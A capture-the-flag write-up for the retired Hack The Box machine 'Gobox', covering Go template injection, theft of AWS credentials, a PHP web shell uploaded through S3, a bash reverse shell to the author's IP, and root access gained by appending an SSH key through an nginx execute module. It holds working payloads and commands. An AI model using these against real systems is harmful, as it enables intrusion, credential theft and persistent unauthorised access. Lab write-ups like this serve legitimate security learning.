# Gobox

This is the write-up for the box Gobox that got retired at the 30th August 2021.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.113   gobox.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/gobox.nmap 10.10.11.113
```

```
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http       nginx
|_http-title: Hacking eSports | {{.Title}}
8080/tcp open     http       nginx
|_http-title: Hacking eSports | Home page
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamid
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port scan:
```
nmap -p- 10.10.11.113
```
```
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
8080/tcp open     http-proxy
(...)
```

## Checking HTTP (Port 80)

The website on port 80 does not have any menus or other information.
The title of the page _"Hacking eSports | {{.Title}}"_ is suspicious and may be a hint to abuse a **Server Side Template Injection (SSTI)** vulnerability.

The page _index.html_ forwards to a different page, while _index.php_ forwards to the default website, which means that PHP is running in the background.

## Checking HTTP (Port 8080)

The webpage on port 8080 has a login form and the response header contains the header _X-Forwarded-Server: golang_, so this web server runs in the programming language **Golang**.

Fuzzing special characters on the login form:
```
wfuzz -u http://10.10.11.113:8080/forgot/ -w /usr/share/seclists/Fuzzing/special-chars.txt -d email=FUZZ --hw 97

wfuzz -u http://10.10.11.113:8080/forgot/ -w /usr/share/seclists/Fuzzing/special-chars.txt -d email=FUZZFUZZ --hw 97
```
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000006:   200        50 L     96 W       1497 Ch     "% - %"
000000008:   200        50 L     96 W       1497 Ch     "& - &"
000000014:   200        50 L     96 W       1499 Ch     "+ - +"
000000016:   502        7 L      11 W       150 Ch      "{ - {"
000000027:   200        50 L     96 W       1497 Ch     "; - ;"
```

The characters _"{{"_ have a different length and response, which means that **SSTI** could work.
When researching SSTI on Golang, there are two articles that describe how to do it:
- [Exploiting Go's template engine to get XSS](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
- [Method Confusion in Go SSTIs lead to file read and RCE](https://www.onsecurity.io/blog/go-ssti-method-research/)

Testing a simple SSTI payload:
```
POST /forgot/ HTTP/1.1
Host: 10.10.11.113:8080
(...)

email={{ . }}
```

It responds with credentials that can be used to login to the website:
```
Email Sent To: {1 ippsec@hacking.esports ippsSecretPassword}
```

After login, it shows source code of the Golang application and in there, the function _DebugCmd_ allows to execute system commands:
```go
// (...)
func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}
// (...)
```

Testing command injection with the SSTI vulnerability:
```
email={{ .DebugCmd "id" }}
```
```
Email Sent To: uid=0(root) gid=0(root) groups=0(root)
```

It works and shows the result of the `id` command, so it can be used to enumerate the box:
```
email={{ .DebugCmd "hostname" }}
```
```
Email Sent To: aws
```

The hostname of the box is _aws_, so checking if the `aws` executable is available:
```
email={{ .DebugCmd "which aws" }}
```
```
Email Sent To: /usr/bin/aws
```

Checking the home folder of root:
```
email={{ .DebugCmd "ls -la ~" }}
```
```
drwx------ 1 root root 4096 Aug 26  2021 .
drwxr-xr-x 1 root root 4096 Aug 24  2021 ..
drwxr-xr-x 2 root root 4096 Aug 24  2021 .aws
-rw------- 1 root root  104 Aug 26  2021 .bash_history
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
```

Enumerating the _.aws_ directory:
```
email={{ .DebugCmd "ls -la ~/.aws" }}

email={{ .DebugCmd "cat ~/.aws/credentials" }}
```
```
aws_access_key_id=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
aws_secret_access_key=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
```

These keys can be used from our local client to access the box.

### Exploiting AWS

Listing **S3 Buckets**:
```
email={{ .DebugCmd "aws s3api list-buckets" }}
```
```
"Buckets": [
        {
            "Name": "website",
            "CreationDate": "2022-08-23T10:57:58.000Z"
        }
    ],
(...)
```

Enumerating the bucket _website_:
```
email={{ .DebugCmd "aws s3 ls s3://website" }}
```

Encoding PHP code to Base64 to write into the bucket:
```
echo "<?php system(\$_REQUEST['cmd']); ?>" | base64
```

Writing the PHP code into _/tmp/cmd.php_:
```
email={{ .DebugCmd "echo -n PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pgo= | base64 -d > /tmp/cmd.php" }}
```

Adding the PHP script to the S3 bucket:
```
email={{ .DebugCmd "aws s3 cp /tmp/cmd.php s3://website/cmd.php" }}
```

Testing command execution:
```
http://10.10.11.113/cmd.php?cmd=id
```

Command execution works and can be used to gain a reverse shell:
```
GET /cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'
```

After URL-encoding the request and sending it, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

Some of the running ports were also found with the initial scan and there is also port 8000 running on localhost:
```
0.0.0.0:4566
127.0.0.1:8000
0.0.0.0:9000
0.0.0.0:9001
(...)
```

The file _/etc/nginx/sites-enabled/default_ shows another web service on port 8000 with the _command on_ parameter enabled:
```
(...)
server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
```

This parameter is from the [NginxExecute](https://github.com/limithit/NginxExecute) module to execute shell commands through GET, POST and HEAD methods.
The default payload does not work:
```
curl -g "http://127.0.0.1:8000/?system.run[id]"

curl: (52) Empty reply from server
```

The module can be found in the file _/usr/share/nginx/modules/ngx_http_execute_module.so_ and the `strings` show a different parameter:
```
strings /usr/share/nginx/modules/ngx_http_execute_module.so | grep run

ippsec.run
```

With the parameter _ippsec.run_ it is possible to execute commands as root:
```
curl -g "http://127.0.0.1:8000/?ippsec.run[id]"

uid=0(root) gid=0(root) groups=0(root)
```

Generating an SSH key pair on our local client:
```
ssh-keygen -f gobox
```

Uploading the public SSH key into the _.ssh/authorized_keys_ file of root:
```
curl -g "http://127.0.0.1:8000/?ippsec.run[echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAA(...)' >> /root/.ssh/authorized_keys]"

curl -g "http://127.0.0.1:8000/?ippsec.run[chmod 600 /root/.ssh/authorized_keys]"
```

Using the SSH key to login as root:
```
ssh -i gobox root@10.10.11.113
```
